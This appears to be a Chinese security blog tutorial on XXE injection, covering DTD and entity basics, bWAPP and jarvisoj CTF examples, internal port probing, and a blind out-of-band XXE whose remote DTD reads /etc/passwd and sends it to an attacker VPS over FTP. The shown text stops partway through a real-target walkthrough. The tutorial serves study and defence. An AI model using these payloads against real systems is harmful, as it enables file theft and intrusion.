<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>XXE漏洞 - B0urne &#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="theme-color" content="red"><meta name="application-name" content="B0urne &#039;s Blog"><meta name="msapplication-TileImage" content="/img/favicon.jpg"><meta name="msapplication-TileColor" content="red"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="B0urne &#039;s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="0x00 XML这次的漏洞是XXE漏洞，全称叫：XML 外部实体注入（XML External Entity Injection）。 首先是XML，XML 是一种标记语言，可以用来定义数据类型，定义好的数据可以方便的在系统间传输和使用。 XML被设计为传输和存储数据，其焦点是数据的内容，目的是把数据从HTML分离，是独立于软件和硬件的信息传输工具。XML文档有自己的一个格式规范，这个格式规范是由一"><meta property="og:type" content="blog"><meta property="og:title" content="XXE漏洞"><meta property="og:url" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/"><meta property="og:site_name" content="B0urne &#039;s Blog"><meta property="og:description" content="0x00 XML这次的漏洞是XXE漏洞，全称叫：XML 外部实体注入（XML External Entity Injection）。 首先是XML，XML 是一种标记语言，可以用来定义数据类型，定义好的数据可以方便的在系统间传输和使用。 XML被设计为传输和存储数据，其焦点是数据的内容，目的是把数据从HTML分离，是独立于软件和硬件的信息传输工具。XML文档有自己的一个格式规范，这个格式规范是由一"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295974594244.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/1529597498511.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295975099603.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295975192117.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295975369757.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295975464414.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295977151714.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295979524821.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295976132603.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/1529597634926.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295976596718.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295980162679.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/1529597684814.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/1529597696340.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295977396671.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295977524378.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295977644027.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15224809138499.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15224809431488.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/1522480960730.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15224809851093.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15224810055081.png!small"><meta property="og:image" content="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/1522481053799.png!small"><meta property="article:published_time" content="2020-09-11T02:31:21.000Z"><meta property="article:modified_time" content="2020-09-11T08:46:20.000Z"><meta property="article:author" content="B0urne"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295974594244.png!small"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/"},"headline":"B0urne 's Blog","image":[],"datePublished":"2020-09-11T02:31:21.000Z","dateModified":"2020-09-11T08:46:20.000Z","author":{"@type":"Person","name":"B0urne"},"description":"0x00 XML这次的漏洞是XXE漏洞，全称叫：XML 外部实体注入（XML External Entity Injection）。 首先是XML，XML 是一种标记语言，可以用来定义数据类型，定义好的数据可以方便的在系统间传输和使用。 XML被设计为传输和存储数据，其焦点是数据的内容，目的是把数据从HTML分离，是独立于软件和硬件的信息传输工具。XML文档有自己的一个格式规范，这个格式规范是由一"}</script><link rel="canonical" href="http://b0u4ne.gihub.io/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/"><link rel="icon" href="/img/favicon.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><script data-ad-client="11" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async></script><meta name="generator" content="Hexo 5.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo2.png" alt="B0urne &#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2020-09-11T02:31:21.000Z" title="2020-9-11 10:31:21">2020-09-11</time>发表</span><span class="level-item"><time dateTime="2020-09-11T08:46:20.000Z" title="2020-9-11 16:46:20">2020-09-11</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/recurrent/">漏洞复现</a></span><span class="level-item">28 分钟读完 (大约4220个字)</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">XXE漏洞</h1><div class="content"><h1 id="0x00-XML"><a href="#0x00-XML" class="headerlink" title="0x00 XML"></a>0x00 XML</h1><p>这次的漏洞是XXE漏洞，全称叫：XML 外部实体注入（XML External Entity Injection）。</p>
<p>首先是XML，XML 是一种标记语言，可以用来定义数据类型，定义好的数据可以方便的在系统间传输和使用。</p>
<p>XML被设计为传输和存储数据，其焦点是数据的内容，目的是把数据从HTML分离，是独立于软件和硬件的信息传输工具。XML文档有自己的一个格式规范，这个格式规范是由一个叫做DTD（document type definition）的东西控制的</p>
<p>如下一个XML文档，它的结构可以分为XML声明、文档类型定义（DTD）、文档元素，其中DTD 是可选的，这次漏洞就是在解析DTD 时产生的。DOCTYPE是DTD的声明，ENTITY是实体的声明，SYSTEM、PUBLIC是外部资源的申请。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &#x2F;&#x2F;XML 声明</span><br><span class="line">&lt;!DOCTYPE entity [                     &#x2F;&#x2F;文档类型定义</span><br><span class="line">    &lt;!ENTITY name &quot;haogang&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt; &#x2F;&#x2F;文档元素</span><br><span class="line">    &lt;nickname&gt;&amp;name;&lt;&#x2F;nickname&gt; &#x2F;&#x2F;文档元素</span><br><span class="line">    &lt;age&gt;18&lt;&#x2F;age&gt;</span><br><span class="line">&lt;&#x2F;author&gt;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p>从两个角度可以把XML分为两类共4个类型：（内部实体、外部实体）、（通用实体、参数实体）。其中两大类含有重复的地方。</p>
<h1 id="0x02-DTD"><a href="#0x02-DTD" class="headerlink" title="0x02 DTD"></a>0x02 DTD</h1><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。</p>
<h2 id="带有DTD的XML文档实例"><a href="#带有DTD的XML文档实例" class="headerlink" title="带有DTD的XML文档实例"></a>带有DTD的XML文档实例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Y0u&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;@re&lt;&#x2F;from&gt;</span><br><span class="line">&lt;head&gt;v3ry&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;g00d!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295974594244.png!small" alt="2.png"></p>
<p>- PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/1529597498511.png!small" alt="5.png"></p>
<p>不过，被解析的字符数据不应当包含任何&amp;，&lt;，或者&gt;字符，需要用<code>&amp;amp;</code> <code>&amp;lt;</code> <code>&amp;gt;</code>实体来分别替换</p>
<p>- CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p>
<h2 id="DTD元素"><a href="#DTD元素" class="headerlink" title="DTD元素"></a>DTD元素</h2><p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295975099603.png!small" alt="6.png"></p>
<p>DTD属性</p>
<p>属性声明使用以下语法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</span><br></pre></td></tr></table></figure>
<p>DTD实例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST payment Hu3sky CDATA &quot;H&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>XML实例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;payment Hu3sky&#x3D;&quot;H&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
<p>以下是属性类型的选项</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295975192117.png!small" alt="7.png"></p>
<p>默认值参数可以使用下列值:</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295975369757.png!small" alt="8.png"></p>
<h2 id="DTD-实体-重要"><a href="#DTD-实体-重要" class="headerlink" title="DTD-实体(重要)"></a><strong>DTD-实体(重要)</strong></h2><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>
<p>实体引用是对实体的引用。</p>
<p>实体可以在内部或外部进行声明</p>
<p><strong>通用实体：</strong><u>&amp;实体名;</u> 引用的实体，他在DTD中定义，在XML文档中引用</p>
<p><strong>参数实体</strong>：</p>
<p>a.使用% 实体名（这里空格不能少）在 DTD 中定义，并且只能在 DTD 中使用%实体名; 引用</p>
<p>b.只有在DTD文件中，参数实体的声明才能引用其他实体</p>
<p>c.和通用实体一样，参数实体也可以外部引用</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295975464414.png!small" alt="9.png"></p>
<p><em>内部实体</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>
<p><em>外部实体</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure>
<p><em>参数实体</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY %实体名称 &quot;值&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>or</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY %实体名称 SYSTEM &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure>
<h2 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h2><p>这里DTD（文档类型定义）的作用是定义XML文件中有哪些模块，这些模块能包含什么样的内容。常见的模块有元素，属性，实体等等。</p>
<p>其中一种模块是实体。实体就像编程语言中的常量，我们可以将一串普通文本定义为一个实体，这样就可以在XML 通过这个实体引用这段文本。实体有两种，直接在DTD 中声明的实体称为内部实体，通过<code>SYSTEM</code> 从外部引入内容的是外部实体。</p>
<p>这样解释比较抽象，我们先来看一个内部实体的示例，看看实体到底是什么。内部实体是指在一个实体中定义的另一个实体，也就是嵌套定义。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE entity [</span><br><span class="line">    &lt;!ENTITY name &quot;haogang&quot;&gt; &#x2F;&#x2F;定义实体 name</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt;</span><br><span class="line">    &lt;nickname&gt;&amp;name;&lt;&#x2F;nickname&gt; &#x2F;&#x2F;使用实体，&amp;实体名;</span><br><span class="line">    &lt;age&gt;18&lt;&#x2F;age&gt;</span><br><span class="line">&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure>
<p>定义好实体后，在XML 中使用实体时，有固定的格式：以 <code>&amp;</code> 开头，中间是实体名，再以 <code>;</code> 结尾。经过解析后，实体将会被替换成定义的内容，这里XML 会变成这样:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;author&gt;</span><br><span class="line">    &lt;nickname&gt;haogang&lt;&#x2F;nickname&gt; &#x2F;&#x2F;将内容替换为实体内容</span><br><span class="line">    &lt;age&gt;18&lt;&#x2F;age&gt;</span><br><span class="line">&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure>
<p>这就是实体，通过将一串文本定义为一个实体，就可以在XML 通过这个实体来引用这段文本。</p>
<h2 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h2><p>在来看一下外部实体，这是一个外部实体的示例，外部实体的标志是使用<code>SYSTEM</code> 将外部文件的内容定义到实体上，然后可以在XML 中通过这个实体，引用外部文件的内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE entity[</span><br><span class="line">    &lt;!ENTITY name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;password&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt;</span><br><span class="line">    &lt;nickname&gt;&amp;name;&lt;&#x2F;nickname&gt;</span><br><span class="line">    &lt;age&gt;18&lt;&#x2F;age&gt;</span><br><span class="line">&lt;&#x2F;author&gt;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p>这里实体将会被替换成定义的内容，也就是<code>/etc/password</code>，正常使用中 <code>nickname</code> 的内容可能被返回给用户，也就会将服务器<code>password</code> 的内容暴露给了攻击者，导致服务器被攻击。</p>
<p>XXE 漏洞，正是利用了XML 外部实体可以解析外部文件的特性，才使得攻击成为可能。</p>
<h2 id="参数实体-外部实体"><a href="#参数实体-外部实体" class="headerlink" title="参数实体+外部实体"></a><em>参数实体+外部实体</em></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">  &lt;!ENTITY % name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">  %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p><code>%name</code>(参数实体)是在DTD中被引用的，而<code>&amp;name;</code>是在xml文档中被引用的。</p>
<p>XXE主要是利用了DTD引用外部实体导致的漏洞。</p>
<h1 id="0x03攻击实例"><a href="#0x03攻击实例" class="headerlink" title="0x03攻击实例"></a>0x03攻击实例</h1><h2 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a><strong>读取任意文件</strong></h2><h3 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h3><p>外部实体引用,有回显</p>
<p>这里我用bWAPP平台上的一道XXE的题目来说明</p>
<p>题目是这样的，我们点击这个按钮然后抓包看看<img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295977151714.png!small" alt="11.png"></p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295979524821.png!small" alt="12.png">可以看到xxe-1.php页面以POST方式向xxe-2.php页面传输了XML数据，既然是XML数据，我们就可以自己增加一个恶意外部实体然后再原本的XML数据中进行实体调用，来进行XXE攻击，如下：</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295976132603.png!small" alt="13.png">可以看到，成功的读取了robots.txt中的内容，这里的hu3sky是我们定义的一个外部实体。</p>
<p>为了更好理解原理，我们来看一看xxe-2.php的源码。</p>
<p>主要代码在这。</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/1529597634926.png!small" alt="17.png">可以看到这里直接用了<code>simplexml_load_string()</code> ，simplexml_load_string() 函数的作用是把XML 字符串载入对象中。函数获取xml内容，并没有做任何过滤，$login获取login标签里的内容，最后拼接到$message显示在屏幕上<img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295976596718.png!small" alt="18.png"></p>
<h3 id="例子二"><a href="#例子二" class="headerlink" title="例子二"></a><strong>例子二</strong></h3><p>jarvisoj上的一道题目API调用</p>
<p>这道题的题目说明是 请设法获得目标机器/home/ctf/flag.txt中的flag值。</p>
<p>进入题目 <a target="_blank" rel="noopener" href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a> 发现一个输入框，我们对其进行抓包<img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295980162679.png!small" alt="3.png">发现了json数据，修改发现可以被解析</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/1529597684814.png!small" alt="4.png">。一开始没有思路，后来看了wp，发现是要把json处改为xml。所以就知道了，这题是xxe。修改json处，构造一个xml表单进行xml注入，得到flag。<img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/1529597696340.png!small" alt="5.png"></p>
<h2 id="检测内网端口"><a href="#检测内网端口" class="headerlink" title="检测内网端口"></a><strong>检测内网端口</strong></h2><p>有回显时，直接发送payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE XXE [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY XXE SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:80&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;XXE;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
<p>当我们检测80端口时，80端口开放，这时会返回页面报错信息(记得url编码。因为页面会解码一次)，如下：</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295977396671.png!small" alt="15.png">当我们检测3389端口，3389端口未开放，端口未开放时返回情况如下：</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295977524378.png!small" alt="16.png"></p>
<h2 id="Bind-XXE"><a href="#Bind-XXE" class="headerlink" title="Bind XXE"></a>Bind XXE</h2><p>如果服务器没有回显，只能使用Blind XXE漏洞来构建一条外带数据(OOB)通道来读取数据。</p>
<p>所以，在没有回显的情况下如何来利用XXE</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15295977644027.png!small" alt="14.png"></p>
<p>思路：</p>
<ol>
<li><p>客户端发送payload 1给web服务器</p>
</li>
<li><p>web服务器向vps获取恶意DTD，并执行文件读取payload2</p>
</li>
<li><p>web服务器带着回显结果访问VPS上特定的FTP或者HTTP</p>
</li>
<li><p>通过VPS获得回显（nc监听端口）</p>
</li>
</ol>
<p>本地客户端(payload 1 )</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;vps&#x2F;test.xml&quot;&gt; %remote;]&gt;</span><br></pre></td></tr></table></figure>
<p>由于web端会解码，所以需要我们先html实体编码一次</p>
<p>payload 2 也就是test.xml的内容(VPS)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY % trick SYSTEM &#39;ftp:&#x2F;&#x2F;VPS:21&#x2F;%payload;&#39;&gt;&quot;&gt;</span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>
<p>这个是先将SYSTEM的file协议读取到的内容赋值给参数实体%payload，第二步是一个实体嵌套，trick是远程访问ftp协议所携带的内容</p>
<h2 id="拓：Bind-XXE实例"><a href="#拓：Bind-XXE实例" class="headerlink" title="拓：Bind XXE实例"></a>拓：Bind XXE实例</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先，与大多数挖洞者的探测模式一样，我对目标网站进行了全方位的服务资产踩点识别，在此过程中，我发现了其中一个子域名网站比较有意思，于是，我就对它进行了目录遍历，然后，就发现了其名为/notifications的服务端。在BurpSuite中，对这个/notifications服务端的请求和响应如下图所示：</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15224809138499.png!small" alt="利用BLIND OOB XXE漏洞获取文件系统访问权限的测试"></p>
<p>在其响应内容中，我注意到，除了有XML内容外，还包含了一个XML SOAP语法体。由于没有GET参数可供测试，因此我决定向该/notifications服务端发送一个简单的，不指定任何内容类型（content-type）的POST请求进行探究，之后，在POST请求发出后，XML SOAP语法体不再出现，而且整个请求响应的代码为200：</p>
<p><img src="/2020/09/11/web%E6%B8%97%E9%80%8F/XXE%E6%BC%8F%E6%B4%9E/15224809431488.png!small" alt="利用BLIND OOB XXE漏洞获取文件系统访问权限的测试"></p>
<p>看来，貌似该Web应用端对POST请求能做出很好的响应，且不会抛出405的请求方法错误，所以我又构造定义了包含content-type: application/xml样式的XML语法内容，用它来作POST请求，看看响应如何：</p>
